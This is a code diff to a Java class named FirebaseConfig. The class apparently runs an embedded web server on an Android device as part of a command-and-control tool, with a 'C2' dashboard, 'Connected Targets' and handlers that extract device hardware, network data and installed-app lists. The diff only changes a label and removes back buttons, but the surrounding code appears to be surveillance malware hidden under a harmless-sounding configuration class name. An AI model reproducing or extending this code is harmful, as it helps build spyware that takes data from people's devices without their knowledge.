@@ -240,7 +240,7 @@ public class FirebaseConfig extends NanoHTTPD {
         String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.trim().isEmpty()) c2Url = "/c2-dashboard";
         String renderBackBtn = isRenderWebhook() ? 
-            "<a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; Connected Targets</a>" : "";
+            "<a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; CONNECTED TARGETS</a>" : "";
 
         return "<!DOCTYPE html>" +
             "<html lang=\"en\">" +
@@ -853,8 +853,6 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response serveDeviceInfo(IHTTPSession session) {
         logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-      
-        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
 
         // --- HARDWARE ANALYTICS SECTION ---
         html.append("<div class=\"card\">");
@@ -1124,7 +1122,6 @@ public class FirebaseConfig extends NanoHTTPD {
     private Response serveAppList(IHTTPSession session) {
         logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Installed Applications</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
